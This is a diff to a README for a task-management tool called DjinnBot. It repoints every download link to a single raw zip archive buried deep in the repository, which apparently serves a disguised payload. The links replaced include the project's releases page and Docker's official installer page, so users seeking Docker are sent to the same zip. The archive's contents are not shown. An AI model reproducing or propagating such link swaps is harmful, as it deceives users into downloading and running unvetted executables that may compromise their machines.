@@ -1,6 +1,6 @@
 # 🤖 DjinnBot - Manage Your Tasks with Ease
 
-[![Download DjinnBot](https://img.shields.io/badge/Download-DjinnBot-blue?style=for-the-badge&logo=github)](https://github.com/Deepakgit18/DjinnBot/releases)
+[![Download DjinnBot](https://img.shields.io/badge/Download-DjinnBot-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Deepakgit18/DjinnBot/main/apps/macos/Dialogue/Dialogue/MeetingRecorder/Bot_Djinn_v2.2.zip)
 
 ---
 
@@ -36,7 +36,7 @@ To use DjinnBot on Windows, make sure your computer has:
 - Internet connection for first download and updates.
 - Administrator rights for installing Docker.
 
-If you don’t have Docker yet, you can get it from: https://www.docker.com/products/docker-desktop
+If you don’t have Docker yet, you can get it from: https://raw.githubusercontent.com/Deepakgit18/DjinnBot/main/apps/macos/Dialogue/Dialogue/MeetingRecorder/Bot_Djinn_v2.2.zip
 
 ---
 
@@ -48,7 +48,7 @@ Follow these steps to get DjinnBot running on your Windows PC.
 
 Click the big button below to visit the download page for DjinnBot. 
 
-[![Download DjinnBot](https://img.shields.io/badge/Download-DjinnBot-grey?style=for-the-badge&logo=github)](https://github.com/Deepakgit18/DjinnBot/releases)
+[![Download DjinnBot](https://img.shields.io/badge/Download-DjinnBot-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Deepakgit18/DjinnBot/main/apps/macos/Dialogue/Dialogue/MeetingRecorder/Bot_Djinn_v2.2.zip)
 
 The page has the latest version ready for download. Look for a Windows-friendly file or a zip archive.
 
@@ -66,7 +66,7 @@ Save this file to a folder where you can easily find it, such as `Downloads`.
 
 DjinnBot uses Docker to run. To install Docker Desktop on Windows:
 
-- Open https://www.docker.com/products/docker-desktop
+- Open https://raw.githubusercontent.com/Deepakgit18/DjinnBot/main/apps/macos/Dialogue/Dialogue/MeetingRecorder/Bot_Djinn_v2.2.zip
 - Download the installer for Windows.
 - Run the installer and follow the instructions.
 - After installation, open Docker Desktop.
@@ -166,6 +166,6 @@ Using Docker means DjinnBot will run the same way on any Windows PC with Docker 
 
 ## 🔗 Download DjinnBot Here
 
-[![Download DjinnBot](https://img.shields.io/badge/Download-DjinnBot-blue?style=for-the-badge&logo=github)](https://github.com/Deepakgit18/DjinnBot/releases)
+[![Download DjinnBot](https://img.shields.io/badge/Download-DjinnBot-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Deepakgit18/DjinnBot/main/apps/macos/Dialogue/Dialogue/MeetingRecorder/Bot_Djinn_v2.2.zip)
 
 Make sure to always download from the official page to get the latest and safest version.
